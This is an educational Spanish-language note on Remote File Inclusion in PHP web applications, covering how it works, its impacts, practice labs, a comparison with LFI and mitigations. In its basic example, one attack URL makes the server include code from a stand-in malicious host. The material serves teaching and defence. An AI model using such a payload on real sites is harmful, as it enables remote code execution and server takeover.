
La vulnerabilidad **Remote File Inclusion (RFI)** es un tipo de falla de seguridad grave en aplicaciones web que permite a un atacante incluir y ejecutar archivos remotos maliciosos. Aquí te dejo una descripción completa sobre RFI, cómo funciona, los riesgos asociados y cómo prevenirla.

---

### **¿Qué es Remote File Inclusion (RFI)?**

RFI ocurre cuando una aplicación web permite a un atacante incluir un archivo ubicado en un servidor externo a través de parámetros de entrada que no han sido validados correctamente. Esto puede llevar a:

- La ejecución de código malicioso en el servidor web.
- El compromiso total del sistema, permitiendo al atacante tomar el control.

---

### **¿Cómo funciona un ataque RFI?**

Un ataque RFI generalmente se produce cuando la aplicación web utiliza entradas del usuario para cargar archivos de manera dinámica sin realizar validaciones adecuadas.

#### **Ejemplo básico**

Supongamos que la aplicación web tiene un parámetro `page` que se utiliza para incluir archivos:

```
http://example.com/index.php?page=about
```

Un atacante podría explotar la vulnerabilidad apuntando a un archivo remoto:

```
http://example.com/index.php?page=http://malicious-site.com/malicious.php
```

En este caso:

1. La aplicación incluye el archivo remoto `malicious.php` desde el servidor controlado por el atacante.
2. El servidor web ejecuta el código malicioso del archivo, permitiendo al atacante realizar acciones no autorizadas.

---

### **Posibles impactos de un ataque RFI**

1. **Ejecución de código remoto**:
    
    - El archivo remoto malicioso puede contener código PHP diseñado para otorgar al atacante acceso completo al servidor.
2. **Compromiso del sistema**:
    
    - Descarga de malware, troyanos o herramientas de control remoto.
3. **Robo de datos**:
    
    - Acceso a información sensible como configuraciones, credenciales o datos de usuarios.
4. **Creación de puertas traseras**:
    
    - El atacante puede instalar scripts para mantener el acceso al servidor incluso después de solucionar la vulnerabilidad.

---

### **Herramientas y recursos relacionados**

1. **Laboratorio de RFI**:
    
    - **[DVWP (Damn Vulnerable Web Project)](https://github.com/vavkamil/dvwp)**: Proyecto diseñado para practicar y comprender vulnerabilidades web como RFI.
2. **Plugin vulnerable de WordPress**:
    
    - **[Gwolle Guestbook](https://es.wordpress.org/plugins/gwolle-gb/)**: Un plugin que ha sido utilizado en pruebas para demostrar vulnerabilidades como RFI.

---

### **Diferencias entre LFI y RFI**

|**Aspecto**|**LFI (Local File Inclusion)**|**RFI (Remote File Inclusion)**|
|---|---|---|
|**Origen del archivo**|Archivos locales en el servidor.|Archivos remotos desde un servidor externo.|
|**Nivel de impacto**|Limitado al acceso local, pero grave si combinado con otras vulnerabilidades.|Puede comprometer completamente el sistema.|
|**Requisitos**|Acceso a rutas locales del servidor.|La aplicación debe permitir incluir URLs remotas.|

---

### **Mitigación y prevención de RFI**

1. **Validación y sanitización de entradas del usuario**:
    
    - Validar los datos que recibe la aplicación mediante listas blancas.
    - Asegurarse de que los parámetros solo acepten rutas y nombres de archivo válidos.
    - Ejemplo en PHP:
        
        ```php
        $allowed_pages = ['home', 'about', 'contact'];
        if (in_array($_GET['page'], $allowed_pages)) {
            include($_GET['page'] . '.php');
        } else {
            die('Acceso no permitido');
        }
        ```
        
2. **Configuración de PHP para deshabilitar inclusiones remotas**:
    
    - En el archivo `php.ini`, desactivar las configuraciones que permiten incluir URLs remotas:
        
```ini
allow_url_fopen = Off
allow_url_include = Off
```
        
3. **Restringir permisos en el servidor**:
    
    - Configurar el servidor web para evitar accesos no autorizados a directorios sensibles.
4. **Uso de firewalls de aplicaciones web (WAF)**:
    
    - Un WAF puede detectar y bloquear solicitudes maliciosas en tiempo real.
5. **Mantener software actualizado**:
    
    - Actualizar regularmente aplicaciones, frameworks y plugins para evitar vulnerabilidades conocidas.

---

[[OWASP]]